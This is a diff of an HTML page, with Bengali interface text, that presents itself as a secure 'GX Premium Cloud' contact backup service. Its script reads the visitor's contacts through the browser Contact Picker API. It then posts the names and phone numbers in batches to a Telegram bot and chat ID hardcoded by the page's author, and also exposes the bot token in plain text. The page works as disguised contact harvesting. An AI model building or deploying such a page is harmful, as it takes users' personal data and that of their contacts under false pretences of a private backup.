@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GX Premium Backup</title>
+    <title>GX Premium Cloud</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
             --primary: #00f2fe;
-            --secondary: #7e22ce;
+            --accent: #7e22ce;
         }
 
         body {
-            background: #020406;
+            background: #010204;
             margin: 0;
             overflow: hidden;
             display: flex;
@@ -23,138 +23,138 @@
             font-family: 'Inter', sans-serif;
         }
 
-        /* ব্যাকগ্রাউন্ড অ্যানিমেশন */
-        .orb {
+        /* অ্যানিমেটেড ব্যাকগ্রাউন্ড গ্লো */
+        .glow-orb {
             position: absolute;
-            width: 300px;
-            height: 300px;
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            filter: blur(80px);
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(0, 242, 254, 0.15), rgba(126, 34, 206, 0.15));
+            filter: blur(100px);
             border-radius: 50%;
             z-index: -1;
-            animation: move 10s infinite alternate;
+            animation: move 15s infinite alternate;
         }
 
         @keyframes move {
-            from { transform: translate(-50%, -50%); }
-            to { transform: translate(20%, 30%); }
+            0% { transform: translate(-30%, -30%); }
+            100% { transform: translate(30%, 30%); }
         }
 
-        .main-container {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(30px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 50px 30px;
-            width: 340px;
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: 45px;
+            padding: 60px 35px;
+            width: 350px;
             text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
             position: relative;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
         }
 
-        /* ইউনিক একশন এরিয়া */
-        .action-circle {
-            width: 120px;
-            height: 120px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px dashed rgba(0, 242, 254, 0.3);
+        .icon-wrapper {
+            width: 130px;
+            height: 130px;
+            border: 1px solid rgba(0, 242, 254, 0.2);
             border-radius: 50%;
-            margin: 0 auto 30px;
+            margin: 0 auto 35px;
             display: flex;
             align-items: center;
             justify-content: center;
+            background: radial-gradient(circle, rgba(0, 242, 254, 0.05), transparent);
+            box-shadow: inset 0 0 20px rgba(0, 242, 254, 0.1);
             cursor: pointer;
-            transition: 0.5s;
-            position: relative;
+            transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .action-circle:hover {
-            border: 2px solid var(--primary);
-            box-shadow: 0 0 30px rgba(0, 242, 254, 0.4);
-            transform: rotate(90deg);
+        .icon-wrapper:active {
+            transform: scale(0.9);
+            border-color: var(--primary);
         }
 
-        .action-circle i {
-            transition: 0.5s;
-            font-size: 40px;
+        .icon-wrapper i {
+            font-size: 45px;
             color: var(--primary);
-            transform: rotate(-90deg); /* বাটন ঘুরলেও আইকন সোজা থাকবে */
+            text-shadow: 0 0 15px rgba(0, 242, 254, 0.6);
         }
 
-        .title-text {
-            font-size: 22px;
-            font-weight: 800;
-            letter-spacing: 1px;
-            background: linear-gradient(to right, #fff, #888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-        }
-
-        .sub-text {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.4);
+        .status-badge {
+            font-size: 10px;
             text-transform: uppercase;
-            letter-spacing: 3px;
+            letter-spacing: 4px;
+            color: rgba(255, 255, 255, 0.3);
+            margin-bottom: 8px;
         }
 
-        .sync-btn {
-            margin-top: 30px;
+        .main-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 25px;
+            letter-spacing: -0.5px;
+        }
+
+        .action-btn {
             background: #fff;
             color: #000;
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 14px;
+            border: none;
+            padding: 16px;
+            border-radius: 20px;
+            font-weight: 800;
             width: 100%;
             cursor: pointer;
-            transition: 0.3s;
-            border: none;
+            transition: 0.4s;
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
         }
 
-        .sync-btn:hover {
+        .action-btn:hover {
             background: var(--primary);
-            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 242, 254, 0.3);
         }
 
-        #status {
-            margin-top: 20px;
-            font-size: 12px;
+        .btn-sub { font-size: 10px; font-weight: 500; opacity: 0.6; }
+
+        #progress-text {
+            margin-top: 25px;
+            font-size: 13px;
+            font-weight: 600;
             color: var(--primary);
-            min-height: 20px;
+            transition: 0.3s;
         }
     </style>
 </head>
 <body>
 
-    <div class="orb"></div>
+    <div class="glow-orb"></div>
 
-    <div class="main-container">
-        <div class="sub-text">System Online</div>
-        <div class="title-text">Cloud Sync</div>
+    <div class="glass-panel">
+        <div class="status-badge">Secure Protocol</div>
+        <div class="main-title">Contact Cloud</div>
         
-        <div class="action-circle" onclick="fetchContacts()">
+        <div class="icon-wrapper" onclick="startBackup()">
             <i class="fas fa-fingerprint"></i>
         </div>
 
-        <p class="text-xs text-gray-500 px-4">নিচের বাটনে চাপ দিয়ে আপনার কন্টাক্টগুলো নিরাপদে ব্যাকআপ করুন</p>
-
-        <button onclick="fetchContacts()" class="sync-btn">
-            SEND TO TELEGRAM
+        <button onclick="startBackup()" class="action-btn">
+            <span>কন্টাক্ট ব্যাকআপ করুন</span>
+            <span class="btn-sub">SEND TO TELEGRAM</span>
         </button>
 
-        <div id="status"></div>
+        <div id="progress-text"></div>
     </div>
 
     <script>
         const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
         const CHAT_ID = '6467941734';
 
-        async function fetchContacts() {
-            const status = document.getElementById('status');
+        async function startBackup() {
+            const pText = document.getElementById('progress-text');
             
-            if (!('contacts' in navigator && 'ContactsManager' in window)) {
-                status.innerHTML = "Browser Not Supported";
+            if (!('contacts' in navigator)) {
+                pText.innerHTML = "❌ Browser Not Supported";
                 return;
             }
 
@@ -162,58 +162,52 @@
                 const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
                 if (contacts && contacts.length > 0) {
-                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processing...`;
-                    await sendData(contacts);
+                    pText.innerHTML = `<i class="fas fa-sync fa-spin"></i> সংযোগ করা হচ্ছে...`;
+                    await processAndSend(contacts);
                 }
             } catch (err) {
-                console.log(err);
+                console.log("User cancelled");
             }
         }
 
-        async function sendData(contacts) {
-            const status = document.getElementById('status');
-            const CHUNK_SIZE = 15;
+        async function processAndSend(contacts) {
+            const pText = document.getElementById('progress-text');
+            const CHUNK = 15;
             
             const now = new Date();
             const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
-            const dayName = days[now.getDay()];
             const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
             const timeStr = now.toLocaleTimeString('bn-BD');
 
-            for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
-                const chunk = contacts.slice(i, i + CHUNK_SIZE);
-                let message = `📊 **GX Backup number**\n\n`;
-                message += `📅 ${dayName}, ${dateStr}\n`;
-                message += `⏰ ${timeStr}\n`;
-                message += `👥 Total: ${contacts.length}\n`;
-                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+            for (let i = 0; i < contacts.length; i += CHUNK) {
+                const list = contacts.slice(i, i + CHUNK);
+                let msg = `📊 **GX Backup number**\n\n`;
+                msg += `📅 ${days[now.getDay()]}, ${dateStr}\n`;
+                msg += `⏰ ${timeStr}\n`;
+                msg += `👥 Total: ${contacts.length}\n`;
+                msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
-                chunk.forEach(c => {
-                    message += `Name : ──${c.name ? c.name[0] : 'N/A'}─\n`;
-                    message += `Number : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
+                list.forEach(c => {
+                    msg += `Name : ──${c.name ? c.name[0] : 'N/A'}─\n`;
+                    msg += `Number : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
                 });
 
-                message += `— GX Sammim sent`;
+                msg += `— GX Sammim sent`;
 
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                     });
                     
-                    status.innerText = `Sent: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
-                    await new Promise(r => setTimeout(r, 1200)); 
-                } catch (e) {
-                    console.error(e);
-                }
+                    pText.innerText = `প্রগতি: ${Math.min(i + CHUNK, contacts.length)} / ${contacts.length}`;
+                    await new Promise(r => setTimeout(r, 1300)); 
+                } catch (e) { console.error(e); }
             }
-            status.innerHTML = "✅ Successfully Completed!";
-            alert("Backup Finished!");
+            // এলার্ট বাদ দিয়ে এখানে সাকসেস মেসেজ দেখানো হচ্ছে
+            pText.style.color = "#38ef7d";
+            pText.innerHTML = "✅ সফলভাবে সম্পন্ন হয়েছে!";
         }
     </script>
 </body>
